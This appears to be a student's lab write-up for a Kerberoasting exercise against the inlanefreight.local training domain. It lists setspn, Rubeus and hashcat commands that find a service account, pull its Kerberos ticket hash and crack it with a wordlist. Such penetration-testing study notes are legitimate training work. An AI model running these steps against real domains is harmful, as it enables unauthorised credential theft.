# [Kerberoasting - from Windows](CPTS/Active%20Directory%20Enumeration%20&%20Attacks/Windows/Kerberoasting%20-%20from%20Windows.md)
## What is the name of the service account with the SPN 'vmware/inlanefreight.local'?

```powershell
setspn.exe -Q */*
```
![](Screenshot%202026-05-27%20at%2020.29.09.png)
## Crack the password for this account and submit it as your answer.

```powershell
 .\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap
```
![](Screenshot%202026-05-27%20at%2020.42.08.png)

```shell
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```
![](Screenshot%202026-05-27%20at%2020.58.28.png)
